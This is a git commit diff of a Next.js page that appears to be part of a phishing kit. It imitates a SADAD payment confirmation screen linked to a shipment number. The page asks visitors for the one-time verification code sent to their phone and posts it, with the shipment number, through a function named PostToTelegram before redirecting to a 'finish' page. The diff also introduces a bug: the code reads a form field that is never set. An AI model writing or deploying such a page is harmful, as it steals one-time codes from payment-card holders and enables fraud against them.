4a5a19d963be64c84813c7fc9fb7dd71b4e3c913
milad998 <myaralbwd20@gmail.com>
2025-08-26 23:46:51 +0300

    Update page.jsx

--- ‏‏my-app/src/app/fozajil/pay/code/codeto/page.jsx
+++ ‏‏my-app/src/app/fozajil/pay/code/codeto/page.jsx
@@ -1,79 +1,86 @@
-"use client"
+"use client";
 
-import styles from './code.module.css'
-import {  useState } from 'react'
-import { useRouter,useSearchParams } from 'next/navigation'
-
-
+import styles from "./code.module.css";
+import { useState } from "react";
+import { useRouter, useSearchParams } from "next/navigation";
 
 const Code = () => {
-  
   const router = useRouter();
   const x = useSearchParams();
-  const datas = x.get("names")
-  const [form,setForm]=useState({
-    data:{
-      كود_ثاني:"",
-      رقم_الشحنة:datas
-    }
-  })
-  const setDynamicFormData = (name,value)=>{
-    setForm({
-      data:{
-        ...form.data,
-        [name]:value,
-      }
-    })
-  }
+  const datas = x.get("names");
+
+  const [form, setForm] = useState({
+    data: {
+      كود_الثاني: "",
+      رقم_الشحنة: datas,
+    },
+  });
+
+  const setDynamicFormData = (name, value) => {
+    setForm((prev) => ({
+      data: {
+        ...prev.data,
+        [name]: value,
+      },
+    }));
+  };
+
   const PostToTelegram = async () => {
     const description = Object.entries(form.data)
       .map((d) => `${d[0]} : ${d[1]} `)
       .join("%0A");
+
     await fetch("/api/sendMessage", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ description }),
     });
-
-    
   };
-  const handlerout = ()=>{
-    if(form.data.كود_ثاني == ""){
-      alert('من فضلك قم بملى الحقول')
-    }else{
-      router.push(`/fozajil/pay/code/finish?names=${datas}`)
+
+  const handlerout = () => {
+    if (form.data.كود_الاول.trim() === "") {
+      alert("من فضلك قم بملىء الحقول");
+    } else {
+      router.push(`/fozajil/pay/code/finish?names=${datas}`);
     }
-  }
-
-
-
+  };
 
   return (
     <div className={styles.contect}>
       <div>
         <div>
-          <img src="" alt="sadad" />
-          <img src="" alt="تنزيل png(4)" />
+          <img src="/sadad.png" alt="sadad" />
+          <img src="/تنزيل4.png" alt="تنزيل" />
         </div>
-      <h1> تاكيد</h1>
-      <p>ادخال الكود المرسل حديثا على هاتفك</p>
-     
-      <form  onSubmit={(e)=>{
-        e.preventDefault();
-        PostToTelegram()
-      }}>
-        
-        <input type="text" name="code" onChange={(e) => {
-                  const { name, value } = e.target;
-                  setDynamicFormData(name, value);
-                }} placeholder="ادخل كود التحقق" />
-        
-        <button type='submit' onClick={handlerout}>دخول</button>
-      </form>
-        <img src="" alt="footersadad" />
+
+        <h1>تأكيد</h1>
+        <p>ادخال الكود المرسل حديثا على هاتفك</p>
+
+        <form
+          onSubmit={(e) => {
+            e.preventDefault();
+            PostToTelegram();
+            handlerout();
+          }}
+        >
+          <input
+            type="text"
+            name="كود_الثاني"
+            value={form.data.كود_الاول}
+            onChange={(e) => {
+              const { name, value } = e.target;
+              setDynamicFormData(name, value);
+            }}
+            placeholder="ادخل كود التحقق"
+          />
+
+          <button type="submit">دخول</button>
+        </form>
+
+        <img src="/footersadad.png" alt="footersadad" />
       </div>
     </div>
-  )
-}
+  );
+};
 
-export default Code
+export default Code;
